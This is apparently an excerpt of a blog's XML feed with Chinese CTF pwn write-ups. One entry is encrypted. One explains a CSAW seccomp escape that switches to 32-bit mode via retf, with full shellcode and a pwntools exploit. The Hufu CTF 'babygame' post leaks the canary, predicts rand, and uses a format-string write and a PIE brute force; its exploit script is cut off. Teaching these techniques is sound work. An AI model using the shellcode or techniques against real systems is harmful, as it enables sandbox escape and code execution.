        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b2e70b57abf3a6f041d8959a17272a558bb15c52d6e35a844875af6f08700d8d">0e96a196e04ab582d32680aaeaf05fdc17ca0dab161dbcdfb87aebd3e10cc06b66c35dd5c42d7eb805acdf59d1a3c9f99f0d2dfce7252f682ef8d4bf3f7116f6558d7f921854cab2e8d33bca9f0d7bc72c5107652ada0fdb708252472ed4c5c9d95e092dab67adff4f8625baaf133c59535f3b8f1bd3cf41d3a0e5b3864ff319a4a85f4d4b3b40b46aa81cf1c197ccc2b96b98caccee5775fbe2b253f90935c6dab7381346507f79948aaf48eda00d87b728383f4258f8df1c62fc4aa8f69b335132c915eff6e0e1515e0dce74e89ff846e24d13a8a5c3ef42373a714a8f8593f81537194eaa543e3c08f753c5cf982ce95e0ab0fc78eb66040635a35422525a05855ab2dbcca6f6aee33d579a3577e805ced889b9cf60f573b8028fe6d28926f1ac84bdd895837a1f0ffdd4b14a4001aeaddf81341ddff0e35933c75c6ab141a1c5d6a9f280a74a83f5ce5e5ba8d88f16f52729446bc6688b3047b3b405520327b6e9ebe4e5fa0d0598ab1cd5d65d906fba1444763ea43838969023e80335ea315bef38aabe2200b1399be278da8d2e21e5b15435c8024e3133d9d64bdd6cd907d711d1a5099c11a9b6aa4120945312fb29c9b470f8aa4b82fbc018ff67dc2859ae22201e1069f5e42d7e23c52751e26e090219b71443b9d5f1ac6029917d0f7a383d08ae634fe2e2cc4bd6883e75a429550037974df4bce8fad15d24dfafbe01b7742405eca26fdf04da06f0399b1b96e9516e32fc4c78bebdde370fc1e05715275643ca6c63e0e602151f67f98f1926531f377095748a4fc4cbae20f34f8b00ba492677577b2f3e6a00f4b36207a500f09e22e2b8715362a614554dd6533b7a83e92ae190385510e0ccb081ba8058b2a74d552d4e02bd46e010f9d9a10ebebed2d16bf0cfa4b15bfc58c7f3090aa274f7dca89a8652005a8abae342ed362724a631b8305fe3e3cc1e195c2a5bc105cfa5db60f2681f9baa2a4f6d50bbbaff3c1cb0f94671c29ffb009372bba8d3a5a738a5f8e4a605c46ccc286f405f0b946c1c6eb1317131eca9c77651a5afb4e5f72a685b8279d7409f5060256fa23561cffcce162e12e22509242e8c9671c490479cedfc95d6be140396093f8d930aeff8c37bffd2d99cada105b4e0a1421db100cb4c3fce1307a5ba4ddd4d6b38313b48fa43ecf875a255d01876b0e605ae9a3ff7798de11f87038562fe52b68c0ba312eed6d1bc6efdaa1112333d6018ca25a4d3d9dbec54d776a7dfb573e3986f6d2c7d1242e7df4f507f2065a9049ba4187c6642c4a81a43fcf080c25ff6f5eb51ce53db44d995776c1402d4000b6c1ed6ecd1b0f442f4ed859c53831ec354e9ba2c9517f7bf70ce01d963df2ea5ef8046a3ed4ca513f388cab5ef5df9181c1eab23493b5fde4b9e3eb96300804304cc1cf632a6a40d6a0c700df9ca38258f4e3adcb6eb081c13f297c140f187b497de6ca8d9d7e1e1ded01fdc8eb2fbaf6dd34da24ecb611a44e3db0c634604bf6a4b0c11d2792b204da28d2ce6882499acec3c82e8d18f7c256fa12fdf916c8cbae679aa6a907e8da2d94c178d9c38334dfdac800fb9d05ed6e5deaae79a82a29fe8698d6a093c4607c3942fe2bbfc2fbdc290e17b0e28e834acfbbe141a3adf8cf82ff375c7bec221b6d033b37b910e3d5e0e5f7731823263e0b6b5dcc860f6d5683e655d3adcfdd7ff1a2857a6cbce4b478e7e2a8ebe062a768bda94994aa1da9aa3700df82b7b34094dcc721f8cd306393ff4ba12a2c075f13460708239487729664d95d9ca7a6106d76c29bc65235f7914279697f969fcfa1a42eb67bb4b1b2381e78affef3b866d858b43d8a98fe8ae45df27b22dea373fcef2700dae92d34c47f0a081f69e4cc3bbc5c8a9b6f61ac2fff7a86a51b2d2dfa6f7f4c067903432580ae66fe12e7f30755012965d5a921876d2cf47cd42585a381ef9971d5d1d4aacc8c44b58da03373fa63889f217579a66cb693444de81dfacbeb61f50af88225b1f80b7fdfac63c52e700f38443e695786c13be361a80e0abc8b10d0cc284e6f6050337cf6b296bb774629de0d9c54762904d1b6c7bf8caeb3062a9278677ca2dd8a9dea8bd4f05e5dcc49731e651f7b2b90e229956d14754575c9402db5965562dd7bc297d469835ed2760ce4643ada8be2517dff0f141e5b3e38a72ae806eaec5251348fd1b001dad1cf401b08a2eec50e2dfc284cd83977f75aa058c24d6a176a7b978ffd986e70c016ab1e4015c8b2cfce9aba402ad99a3be237679aa9e568a5a28a0555ac7aca82655c4789b7c01e64f61e80fe81caa241f887652299bc3352caf28edb44523111ac9b267d0f01311eb49daebdf68cc97ab11d2589577094d46562d771d6fab5feee8e926011451d871cec0fcbc4f888c6a64a1a5cb1de53793d0d9fb11df53b52e20e466babf69d9c821bd7f26c5cb35c8704c8cb08b1cd64153a8f28c65e53dfcbb653533e93efebcf659b5ca15d31c3f4f558f48eb576bf66160649cf60fb727cd597596ccbdcbb8288dca32d462f455df057d7d576966f25b3eff3249803c587d4cd6329cf7101cbf8e185d7cef6d21167c5e87431a9eba504e88ab5676c4ceff47a6dd7714773fc9d39a77a5f0c3cd80447339c5af46ce7e96824681f9d2a12d309ebe9d9c03139d3ca31c4abc5502f6a9dbeb8679c2fadab3bcf395a1b117638fbba41efa28eadfe26997c1dceb660d5af496276200c496363a3f9de3c879cd47483fc7c13097b604e8e70cab686fdeb07abb103cd1f11f1de9292523f1fae2ec609bb3a70d2c98a306c15595ca44b28ecadebf85d691bc2615bdcfd1975a4687a295ea203eae6a5435174b16cab218d0d918cc0f792570762394271194f6cf0d8c4fb532a0fabebdda590a8c6ec9a0a2d7aeee577e8411a42ebe32fc7561ae4da3b508043a3f1e8d21504e325adedf10a4317f5a3869f04dc2c08527f2465a1aa59f98a2d3913b5e62fe453fd7873d1f860a209bd60c61c962caa40a33427e708944fadb65af19388967d71d513b3d2a1adcb2b38149ce03778eb9050a28c0c82f30f990506a292519f949ada815787153d6b34c292a1d9fcb5c2d306642e771a09405196a7f2b59035ffa6a9d5c9d1f1079441ccc19428c692e19d6056b964c28cee73f26ed9bf53445577cd7566c943b165a8b8cc5deefcd998df3c993a96344d2bf9b5ef2704381aab032fdd903cbf307cd842bffaa03f0ae1ac8178bfcdb26b0eb67d36ab717840c53f19dd1eae011f2e75de9e50245a20683dc8e7dab1235d6ed67ca1c97f2cfe0cd43b2dffc2479dfd6c8e54e81451a86ae7473b8dd30981bf40910e8ddd418ffec27e3c40b8d00fdd9459e574ec1d47c85b55ad1368b74d8158c1ba0f0cd3d6093ed3e97b0217733df490b3956be53830da3af08138448d6a5d4e6e32cfad6cbb518f5669948423966f46a3399ccfbc94762643a9a5caa8a5a04d63a8d34e8344bc32e923fd4ee0e2137ba753de9df86d3a487bf336fd4fc18b05aa225b8ee5aea07c77e7988e422af4fabd0726ef8712bda44868e67a4ef0dd44820ae7f8298995f0068f9f8af7d244524e864b02a2be48dd78cb6f54e6569a05c60921cba2b49a2ea7eeda5e7e87c0cafa2fc1e39a2956d547c2b751b4983a728cfacbf4f40abce60325a99b802a1aec7480bca9fb22ddfae5874feee0054579fb907625756a0dc513a51bdd4b38df6c0de9a6cff8c01108c47c770682b84011bc22b2c2d100fe3c925480a5f87fd7888a26f86342a1c511c5d133aee5f55ca35ee993a255a9b33707a2f2bb942397be97c2c11fcf9ef1bb8b8d7b3c7ff0bb26a28f1b225c45b63c14aeb498fbeb86f67fbe03aad6c5d066f45ebab4f6249ff00efa0373a2e7936e380ff62fd57514644a57a95a17c4d123f6268451e0cd5ddb69465d6574f4237897fac17b06dd83c22f6339bcfeb166040561021834149db5a7cad8c97e71c6b45fe4e8f320f583b762c3fa2c3c003ee3700d7652d392585a38a2a6241eabbfd4c85eb7ea565864e2c310862db5a1921d10018c69643a73d22eaecc96ff7c94418bfa7f769520e1ea5b32e1f4b08ac18f402af8391fc17381c41501f8392657fa741dfc3732b8ebb761c9215c972641ee36b2569161bc2186e07f46c6b0f806c13a1f87bf4676147e9201761ffddff188c6078cb87a20b1674ba24e9df0f9d70cf3aaee19a1120411944c051ce373f87afd8fcd49c3637c01be956dae74a88df1fa704617a7b94154da762a1e7dd810130f4454cb44dc50c0d19f686580b086348afeb61c121a44653def0b62408a85953e9dd90281a57edaf77eb677dfc2e22e6c20f5e44703ff982b9f993cbdee26e06ccfc4d96ce57b918a52d2b215a80cff1024f5e54ca8cc5213d4f6277929af0c310d722a9bd74e99d15aa07a059684c2129a127661eeaace97cddd0130baf95f42bb8f786dfbe60d59698b99197734fb101129a94c6b1cee2e3a005fe882258a78ed6ecbc5461c149cbf5765ddbd35c64408688876f1eb929159b374b5d3510ae7a75356e19052a93f4936a8bf868c83a4da183d24c0604bb64b8ca0339cb4da1039aaf4c7931e0bf7f7584ef896f0f7e4e8fd88f645da1a7d64a469321e2fd1f892a8f07946f8356490b6db840e9c2f4b16f7a644d1b6bfd02c162a58f3222acff69a6ed7afcab37271f9fb090cc7e496cfdbf8f6b710136a9d1bad5177673e66afb08b366d1e9a8039d8458d761f741b59943fd92deb4540ba519e8367443b875fade64b53b52b390fdf65fbb9e6d680b2125df926205b0e16df9dbcc812b4aef6d1670e95b1723957641302b5592173dfea405480b12a0190b5fbbf1c9d94e63dc577a7209b5fb8c5ad8682344189eac7b6a036d9b2bdba515a8da6b47ca138d4487e5adbf024b7667e0b21fde518ca84fa7752d556884b2a4ffd86311a4e1b9581144ebf67642e1c5b63b14125806c43576cd6e7de62059bc5643a41f10e66c83d5176c517baa20322c70a1c6528d8207d65fa9b034a5ddfdc8c240e8fc31879ef61ee3b6d594533128061abecceaf50e847f5e71c783ef9b314095025ae283a363f7019294e155d8c27da9ffeaa24acfa85fb2c0b417c745f549f67e43266e0ec6d93897264c3fad929775fbc18c3f560a77084d234c4c4e017172f5568c7c34a1cb02f1f92b96e8a080d26738d5decefba3669910311cb1e2006d8285a6210fbd0116544ed6ca5c1e31fb0683630e917d6ff63c8f45106c96675ec225edcdcd7fe58648f9e213c3c06e13b5ce0b2f9001a03a70e1102c0f889cc967620b2cefe8b79f1ed0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沙箱逃逸----切换进程工作模式绕过</title>
      <link href="/posts/cb4bda90.html"/>
      <url>/posts/cb4bda90.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面：">写在前面：</h2><p>这两天打CSAW又学到了一种新的沙箱逃逸的方法–切换进程的工作模式，使用32位的系统调用号执行系统调用，来绕过原本沙箱禁用掉的系统调用。理解起来倒也不难，但是有几个点需要注意一下，这里详细的记录下利用过程。</p><p>沙箱的基础知识就不再介绍了，不了解的师傅可以自行百度。</p><h2 id="利用过程-调试">利用过程&amp;&amp;调试</h2><p>先看下程序逻辑(如下)，就是输入数据，然后将其执行。在执行前开启了沙箱保护。</p><p><img src="../img/2706180-20220912231002326-165259550.png" alt=""></p><p>我们看一下本题沙箱禁用的系统调用(如下图)，我们发现没法执行execve，同时禁用了openat和open这两个系统调用，这就意味着orw和execve两种拿到flag的方式都无法使用了。</p><p><img src="../img/2706180-20220912231014492-423761031.png" alt=""></p><p>这里我们利用一种新的思路来进行沙箱逃逸，观察上图的禁用规则，我们发现并没有检查架构。如果正常检查架构的沙箱规则应该如下：</p><p><img src="../img/2706180-20220912231025985-268851744.png" alt=""></p><h3 id="控制cs寄存器">控制cs寄存器</h3><p>而retf这个指令是相当于pop ip；pop cs</p><p>而在x64系统下，进程有两种工作模式(32位工作模式和64位工作模式)。决定了是哪种工作模式的是cs寄存器**(cs=0x23 则为32位工作模式，cs=0x33 则为64位工作模式)**，如上所说，我们可以用retf指令来控制cs寄存器。而这里要注意，因为我们切换的是32位工作模式，<strong>因此这里的ip寄存器应该是eip寄存器，而cs寄存器本身也是四字节，所以我们想要往eip和cs寄存器填充的两个值一共应该是八字节数据，共占用一个64位程序下的内存单元才对</strong>。</p><h3 id="映射小于等于四字节地址">映射小于等于四字节地址</h3><p>但是有一点如果切换到32位工作模式后，那寄存器用的则是32位寄存器，原本64位寄存器里装的6字节地址就无法正常使用了，因此在这之前我们需要调用mmap映射一段小于等于四字节的可读可写可执行的内存地址空间，然后我们将执行流迁移到这片区域上，因为地址小于等于四字节放到32位寄存器中也是ok的。</p><p><img src="../img/2706180-20220912231042351-1607796039.png" alt=""></p><p>上图是执行mmap映射了一段可读可写可执行的区域，下图是执行系统调用read将数据写到刚刚映射出来的这段区域</p><p><img src="../img/2706180-20220912231052458-225522993.png" alt=""></p><h3 id="切换进程的工作模式">切换进程的工作模式</h3><p>切换进程的工作模式其实就是用retf指令来控制cs寄存器，不过需要注意的是我们将执行流迁移到新映射的内存区后，将<strong>栈也迁移过来</strong>(因为原本的栈地址是6字节的，我们切换到32位工作模式后无法再访问原本的栈)。<strong>迁移栈的地方要和映射的起始区域错开</strong>，不能将栈进行新的迁移后，执行push时干扰到我们原本布置的指令。</p><p>首先是先布置一下eip和cs的数据，先push到栈里(这里一定要注意是二者共用一个内存单元，一个值仅仅占四字节)，举个例子，比如我映射了一段0x100000的内存区域，然后要切换到32位的工作模式上，那么我压入的数据应该是0x2300100000（因为要迁移执行流，所以给eip寄存器的是0x100000）(如下图)</p><p><img src="../img/2706180-20220912231102480-775571867.png" alt=""></p><p>下图是已经执行了retf，切换到了32位工作模式。(我们观察下面的栈也可以看出来，执行后的栈已经无法使用了，对比上面正常的栈，发现只保留了4字节，这就说明已经切换了32位工作模式)</p><p><img src="../img/2706180-20220912231725874-1239549974.png" alt=""></p><p>最后就是记得把栈给迁移过来(如下)</p><p><img src="../img/2706180-20220912231124110-1797761142.png" alt=""></p><h3 id="orw获取flag">orw获取flag</h3><p>然后打一个常规的32位orw即可。（如下）</p><p><img src="../img/2706180-20220912231132815-1193419232.png" alt=""></p><h3 id="执行32位下的execve的报错">执行32位下的execve的报错</h3><p>最终正常执行我们的32位程序中的系统调用即可，这里要注意一下，我们还是无法执行execve获取shell，因为execve(“/bin/sh”,0,0)其实是去运行了/bin/sh这个程序，而这个程序的位数是跟系统一样的。如果是64位系统，那么/bin/sh这个程序就是64位的(依旧绕不过沙箱)，这样就导致了我们虽然是工作模式切换过来了，但是后续执行/bin/sh的时候报错了。</p><p>执行32位中的execve情况如下：</p><p><img src="../img/2706180-20220912231141493-2079768539.png" alt=""></p><p>这里要解释一下图中看的明明是执行的munmap，这是因为工作模式虽然切换到32位了，但是这个gdb调试到这里，它依然认为这个系统调用号是64位的，所以就显示了munmap，不过现在确实执行的是32位中的execve系统调用。</p><p>可以看见红框里的报错提示，首先第一行我们确实是成功执行了execve(“/bin/sh”,0,0)，创建了新的进程/usr/bin/dash</p><p>但是第二行就报了一个错误，说是Bad system call。这就说明执行了64位的系统调用，然后被沙箱给禁用了。这也就验证了上面所说的/bin/sh这个程序就是64位的(依旧绕不过沙箱)。</p><p>因此我们依旧只能用orw读出flag。</p><h2 id="EXP">EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;chal3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    rax,0x9</span></span><br><span class="line"><span class="string">mov    rsi,0x5000</span></span><br><span class="line"><span class="string">mov    rdi,0x100000</span></span><br><span class="line"><span class="string">mov    rdx,0x7</span></span><br><span class="line"><span class="string">mov    r10,0x21</span></span><br><span class="line"><span class="string">xor    r8,r8</span></span><br><span class="line"><span class="string">xor    r9,r9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rsi,rdi</span></span><br><span class="line"><span class="string">xor    rdi,rdi</span></span><br><span class="line"><span class="string">xor    rax,rax</span></span><br><span class="line"><span class="string">mov    rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">movabs r8,0x2300100000</span></span><br><span class="line"><span class="string">push   r8</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x48\xC7\xC0\x09\x00\x00\x00\x48\xC7\xC6\x00\x50\x00\x00\x48\xC7\xC7\x00\x00\x10\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x21\x00\x00\x00\x4D\x31\xC0\x4D\x31\xC9\x0F\x05\x48\x89\xFE\x48\x31\xFF\x48\x31\xC0\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x49\xB8\x00\x00\x10\x00\x23\x00\x00\x00\x41\x50\xCB&quot;</span></span><br><span class="line">p.sendline(s)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">orw=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    esp,0x100100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x0</span></span><br><span class="line"><span class="string">push   0x67616c66</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">push   0x5</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x4</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">o=<span class="string">&quot;\xBC\x00\x01\x10\x00\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x04\x58\xCD\x80\xB8\x01\x00\x00\x00\xCD\x80&quot;</span></span><br><span class="line">p.sendline(o)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章：">参考文章：</h2><p><a href="https://www.cnblogs.com/vi0let/articles/15978203.html">特殊情况下sandbox的bypass - vi0let - 博客园 (cnblogs.com)</a></p><p><a href="https://www.jianshu.com/p/4a0a70ddec37">32位64位交叉编码 - 简书 (jianshu.com)</a></p><h2 id="题目附件：">题目附件：</h2><p>链接：<a href="https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0">https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0</a><br>提取码：7gt0</p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎符CTF2022 babygame</title>
      <link href="/posts/9107d8ac.html"/>
      <url>/posts/9107d8ac.html</url>
      
        <content type="html"><![CDATA[<p>总结：</p><p>通过这道题的学习与收获有：</p><p>1、第一次尝试用爆破的方式来对抗PIE保护</p><p>2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本）</p><p>3、%s顺带打印出来canary并且泄露栈中数据（权当复习了）</p><p>4、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。</p><p>5、格式化字符串这道题考察了一个payload里面，同时写和同时读。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220324174639847-1315554433.png" alt=""></p><h2 id="题目分析：">题目分析：</h2><p><img src="../img/2706180-20220324174650447-1634759747.png" alt=""></p><p>发现了溢出点（不过程序开了canary)，并且有个srand函数，猜测应该题目是个猜数游戏，同时我们还可以控制seed。</p><p><img src="../img/2706180-20220324174704154-1694550770.png" alt=""></p><p>猜数的逻辑是随机生成一个数字（可能为0,1,2），如果是0，你就要输入1；如果是1，你就要输入2；如果是2，你就要输入0。否则的话就返回0，如果满足条件就继续循环，直至100次，如果全部满足条件就返回1。</p><p><img src="../img/2706180-20220324174714420-1154506487.png" alt=""></p><p>如果返回的是1，就可以进入这个sub_13F7函数，发现这个函数虽然没有溢出，但是存在一个格式化字符串漏洞。</p><h2 id="做题思路">做题思路</h2><p>首先考虑一个点，程序给了溢出点，如果不用就太可惜了。用的话就要先泄露canary。可以发现read后面紧接着有一个%s将buf所打印出来，很明显这里可以把canary给带出来。</p><p>格式化字符串漏洞的威力很大，想利用的话，就要控制种子写个脚本跑一下即可进入存在格式化字符串漏洞的函数。</p><p>为了不将%s打印的内容截断，我们考虑把read输入的内容全写成\x11，直到把canary的00给覆盖了（防止00截断%s）。</p><p><img src="../img/2706180-20220324174724027-646162084.png" alt=""></p><p>发现canary存放的是var_18。</p><p><img src="../img/2706180-20220324174732236-219441364.png" alt=""></p><p>read输入的buf在这里<img src="../img/2706180-20220324174740965-1855297000.png" alt=""></p><p>因此offset=0x120-0x18+1=0x109（加1的目的是为了把canary的00给覆盖了）</p><p>然后考虑下格式化字符串怎么用？如果只根据现在获取的信息的话，我也不知道怎么用，不过可以先把脚本写出来，调试一下，看看栈里面有没有可用的信息。</p><p>半成品脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    v2=libc.rand()%<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">        v3=<span class="number">0</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到现在已经进入到了存在格式化字符串漏洞的函数。</p><p><img src="../img/2706180-20220324174752621-1282773898.png" alt=""></p><p><img src="../img/2706180-20220324174801443-513220805.png" alt=""></p><p>有两个非常值得注意的点，也是这道题的突破口，就是栈里存了一个atoi偏移16的真实地址。我们有个格式化字符串漏洞，可以打印栈中数据（不过有个条件），倘若拿到了atoi的真实地址，我们就获得了libc基地址，然后就可以去搜一下one_gadget了。别忘了，格式化字符串是可以任意地址任意写的（尝试将返回地址写成one_gadget地址）。</p><h2 id="问题与对策">问题与对策</h2><p>那现在有几个问题要考虑一下。</p><p>第一，格式化字符串打印栈中数据的前提是需要泄露栈地址，才可以打印指定的栈内容，怎么泄露栈地址？</p><p>第二，拿到libc基地址，再发送one_gadget，就势必需要劫持函数的控制流，可是我们第二次的read是没办法溢出的。</p><p>第三，怎么对抗PIE保护？</p><h3 id="解释问题一：">解释问题一：</h3><p><img src="../img/2706180-20220324174811564-1299319852.png" alt=""></p><p>我们再次观察栈中的数据发现，canary被%s打印完之后，打印并不会停止（因为没有遇见00），因此下面的栈中数据也被泄露出来了，碰巧这个数据是个栈地址。因此我们只需要接收完canary之后，再接收6字节，就可以泄露栈地址了。</p><h3 id="解释问题二：">解释问题二：</h3><p>由于我们第一个read虽然可以溢出，但是我们只能去填充垃圾数据把canary和leak_stack_addr给带出来，因此没办法控制返回地址，第二个read没法溢出。那我们依旧<strong>考虑格式化字符漏洞，尝试用它去修改返回地址（我们完全可以这样做，因为我们已经拿到了泄露的栈地址）</strong>，修改返回地址为哪个地址？毋庸置疑，还得是第一个read的地址，因为我们要将one_gadget地址放到返回地址。当我试图将one_gadgeet地址写入返回地址时，突然意识到开启了PIE保护。</p><h3 id="解释问题三：">解释问题三：</h3><p>先看下PIE保护所造成的问题吧。</p><p><img src="../img/2706180-20220324174821291-294182259.png" alt=""></p><p><strong>我现在试图将lea rax,[rbp-0x120]这个指令地址写入返回地址</strong>，可是发现由于PIE保护的原因，每次程序运行的时候，这个地址只有后三位不变，前面的内容都会改变。这种情况就很是尴尬，<strong>因为格式化字符串写的时候要么一次写一字节（两位），要么一次写两字节（四位）</strong>（这里就不考虑一次写四字节的情况了）</p><p>因此我们根本没办法去正好控制后三位，那我们只控制后两位，让第三位去继承原本返回地址的内容？</p><p>返回地址</p><p><img src="../img/2706180-20220324174830880-911959010.png" alt=""></p><p>要修改成的地址<br><img src="../img/2706180-20220324174839396-1962481222.png" alt=""></p><p>可以发现，这俩并不凑巧相同。那控制后四位（即两字节）？</p><p><strong>控制后四位的话，我们确实可以定死后三位，但是倒数第四位由于PIE的原因，它是随机的</strong>，这条路行不通？</p><p>经过我尝试了许多别的方法，无论如何也都走不通，最后我又拐回来想这条路，突然意识到一件事，只有仅仅是倒数第四位随机而已，<strong>如果爆破呢？我们就随便蒙一个倒数第四位，正确的概率是1/16</strong>(已经不低了)(意思就是说每次PIE，使基址倒数第四位是随机的（后三位地址是固定的），我们可以蒙一个数，然后去运行程序，只要有一次运行的程序基址倒数第四位是我们蒙的数字，就说明我们此时爆破成功），此时就可以顺利返回到one_gadget的地址了。</p><h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">    libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">    payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">    canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span 